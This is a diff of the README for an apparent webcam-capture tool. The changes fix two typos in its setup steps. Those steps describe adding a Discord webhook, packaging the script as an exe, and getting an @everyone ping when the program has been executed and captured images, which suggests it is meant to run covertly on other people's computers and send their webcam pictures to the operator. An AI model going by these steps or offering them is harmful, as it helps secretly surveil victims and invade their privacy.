@@ -12,8 +12,8 @@ code ✅
 | Start by creating a discord webhook	|
 | do ` git clone` this project or simply [download](https://github.com/Rdimo/Webcam-recorder/archive/refs/heads/main.zip) it	|
 | Open the folder in [visual studio code](https://code.visualstudio.com/Download#) or other editor of your choice							|
-| open terminal and type `pip install requiremtns.txt` to install the required modules 		|
+| open terminal and type `pip install requirements.txt` to install the required modules 		|
 | put your webhook in on line 5	|
-| then run exe.bat if you want to convert it to an exe (need pyinstaller to create exe -` pip install pyinstaller`) 				|
+| then run exe.bat if you want to convert it to an exe (need pyinstaller to create exe `pip install pyinstaller`) 				|
 | additionally remove the @everyone on line 52 if you don't want it to ping when the program has been executed and succesfully captured images 				|
 | `Done!` 				|
